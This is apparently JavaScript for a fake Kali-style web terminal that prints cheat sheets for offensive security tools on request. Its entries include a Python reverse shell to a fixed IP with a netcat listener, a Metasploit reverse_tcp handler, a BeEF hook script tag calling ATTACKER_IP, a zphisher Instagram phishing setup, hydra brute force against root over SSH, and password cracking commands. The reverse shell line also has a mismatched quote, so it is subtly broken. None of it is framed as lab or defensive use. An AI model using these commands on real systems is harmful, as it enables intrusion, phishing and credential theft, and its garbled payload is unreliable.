const TOOL_DB = {
    "nmap": "[+ NMAP NETWORK DISCOVERY & VULN SUITE +]\n\n1. INSTALLATION:\n   sudo apt update && sudo apt install nmap -y\n\n2. EXECUTION:\n   sudo nmap -sS -sV -O -T4 target_ip\n   nmap --script vuln target_ip\n\n3. TROUBLESHOOTING:\n   [Error]: Requires root privileges -> [Fix]: Use sudo nmap.",
    "gobuster": "[+ GOBUSTER URI BRUTE-FORCER +]\n\n1. INSTALLATION:\n   sudo apt install gobuster -y\n\n2. EXECUTION:\n   gobuster dir -u http://target.internal -w /usr/share/wordlists/dirb/common.txt\n\n3. TROUBLESHOOTING:\n   [Error]: Wildcard DNS -> [Fix]: Use --exclude-length flag.",
    "nikto": "[+ NIKTO WEB SCANNER +]\n\n1. INSTALLATION:\n   sudo apt install nikto -y\n\n2. EXECUTION:\n   nikto -h http://target.internal\n\n3. TROUBLESHOOTING:\n   [Error]: 403 Forbidden -> [Fix]: Use evasion tuning flags.",
    "enum4linux": "[+ ENUM4LINUX SMB ENUMERATOR +]\n\n1. INSTALLATION:\n   sudo apt install enum4linux -y\n\n2. EXECUTION:\n   enum4linux -a target_ip\n\n3. TROUBLESHOOTING:\n   [Error]: Logon failure -> [Fix]: Provide valid credentials.",
    "metasploit": "[+ METASPLOIT FRAMEWORK C2 +]\n\n1. INSTALLATION:\n   curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/installer/msfinstall > msfinstall && chmod +x msfinstall && sudo ./msfinstall\n\n2. EXECUTION:\n   msfconsole -q\n   use exploit/multi/handler\n   set PAYLOAD python/meterpreter/reverse_tcp\n   exploit\n\n3. TROUBLESHOOTING:\n   [Error]: DB connection failed -> [Fix]: sudo msfdb init",
    "sqlmap": "[+ SQLMAP DATABASE TAKEOVER +]\n\n1. INSTALLATION:\n   git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev\n\n2. EXECUTION:\n   python3 sqlmap.py -u \"http://target.internal/page.php?id=1\" --batch\n   python3 sqlmap.py -u \"http://target.internal/page.php?id=1\" --dbs\n\n3. TROUBLESHOOTING:\n   [Error]: Timed out -> [Fix]: Use --random-agent flag.",
    "searchsploit": "[+ SEARCHSPLOIT EXPLOIT-DB +]\n\n1. INSTALLATION:\n   sudo apt install exploitdb -y\n\n2. EXECUTION:\n   searchsploit apache struts\n   searchsploit -m 46353.py\n\n3. TROUBLESHOOTING:\n   [Error]: Outdated DB -> [Fix]: Run searchsploit -u.",
    "beef": "[+ BEEF BROWSER EXPLOITATION +]\n\n1. INSTALLATION:\n   sudo apt install beef-xss -y && sudo beef-xss\n\n2. HOOK SCRIPT:\n   <script src=\"http://ATTACKER_IP:3000/hook.js\"></script>\n\n3. TROUBLESHOOTING:\n   [Error]: Auth failed -> [Fix]: Edit /etc/beef-xss/config.yaml.",
    "zphisher": "[+ ZPHISHER PHISHING CORE +]\n\n1. INSTALLATION:\n   git clone https://github.com/htr-tech/zphisher.git\n   cd zphisher && bash zphisher.sh\n\n2. SCRIPT LOGIC:\n   php -S 127.0.0.1:8080 -t sites/instagram &\n\n3. TROUBLESHOOTING:\n   [Error]: Port in use -> [Fix]: sudo fuser -k 8080/tcp",
    "hydra": "[+ THC HYDRA BRUTE-FORCER +]\n\n1. INSTALLATION:\n   sudo apt install hydra -y\n\n2. EXECUTION:\n   hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target_ip -t 16\n\n3. TROUBLESHOOTING:\n   [Error]: Connection refused -> [Fix]: Lower thread count with -t 4.",
    "john": "[+ JOHN THE RIPPER +]\n\n1. INSTALLATION:\n   sudo apt install john -y\n\n2. EXECUTION:\n   zip2john target.zip > hash.txt && john hash.txt\n\n3. TROUBLESHOOTING:\n   [Error]: No hashes loaded -> [Fix]: Check hash file format.",
    "aircrack": "[+ AIRCRACK-NG WIFI SUITE +]\n\n1. INSTALLATION:\n   sudo apt install aircrack-ng -y\n\n2. EXECUTION:\n   sudo airmon-ng start wlan0\n   sudo aircrack-ng -w wordlist.txt capture-01.cap\n\n3. TROUBLESHOOTING:\n   [Error]: Channel hopping failed -> [Fix]: sudo airmon-ng check kill",
    "hashcat": "[+ HASHCAT GPU CRACKER +]\n\n1. INSTALLATION:\n   sudo apt install hashcat -y\n\n2. EXECUTION:\n   hashcat -m 0 -a 0 md5_hashes.txt wordlists/rockyou.txt\n\n3. TROUBLESHOOTING:\n   [Error]: No GPU detected -> [Fix]: Use CPU fallback mode -D 1.",
    "shell": "[+ PYTHON REVERSE SHELL +]\n\n1. SCRIPT:\n   python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.0.0.15\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/bash\",\"-i\'])'\n\n2. TROUBLESHOOTING:\n   [Error]: Connection refused -> [Fix]: Start listener: nc -lvnp 4444",
    "netcat": "[+ NETCAT LISTENER +]\n\n1. INSTALLATION:\n   sudo apt install netcat-traditional -y\n\n2. EXECUTION:\n   nc -lvnp 4444\n\n3. TROUBLESHOOTING:\n   [Error]: Option -e incompatible -> [Fix]: Use update-alternatives to switch nc.",
    "socat": "[+ SOCAT ENCRYPTED RELAY +]\n\n1. INSTALLATION:\n   sudo apt install socat -y\n\n2. EXECUTION:\n   socat TCP-LISTEN:80,fork TCP:192.168.1.100:8080\n\n3. TROUBLESHOOTING:\n   [Error]: Missing PEM -> [Fix]: Generate cert with OpenSSL."
};

function loadModule(name) {
    document.getElementById('terminal-input').value = name;
    processCommand();
}

function processCommand() {
    const input = document.getElementById('terminal-input');
    const consoleBox = document.getElementById('terminal-console');
    const raw = input.value.trim();
    const cmd = raw.toLowerCase();

    if(!raw) return;

    consoleBox.innerHTML += "\n\nroot@dx08-kali:~# " + escapeHtml(raw);
    consoleBox.innerHTML += "\n[*] Parsing module database, compiling upstream script, and checking diagnostic logs...";
    consoleBox.scrollTop = consoleBox.scrollHeight;

    setTimeout(function() {
        let res = "";
        if(TOOL_DB[cmd]) {
            res = TOOL_DB[cmd];
        } else if(cmd === 'clear') {
            consoleBox.innerHTML = "DX08 Enterprise Security Core v15.0 (Debian/Kali GNU/Linux Bookworm)";
            input.value = "";
            return;
        } else if(cmd === 'help') {
            res = "Available enterprise modules: nmap, gobuster, nikto, enum4linux, metasploit, sqlmap, searchsploit, beef, zphisher, hydra, john, aircrack, hashcat, shell, netcat, socat.";
        } else {
            res = "[+ MODULE: " + escapeHtml(raw).toUpperCase() + " UNRESTRICTED SPECIFICATION +]\n1. INSTALLATION:\n   sudo apt update && sudo apt install " + escapeHtml(raw) + " -y\n2. TROUBLESHOOTING:\n   [Fix]: Clone official upstream repository and compile.";
        }
        consoleBox.innerHTML += "\n\n" + escapeHtml(res);
        consoleBox.scrollTop = consoleBox.scrollHeight;
        input.value = "";
    }, 300);
}

function escapeHtml(text) {
    return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}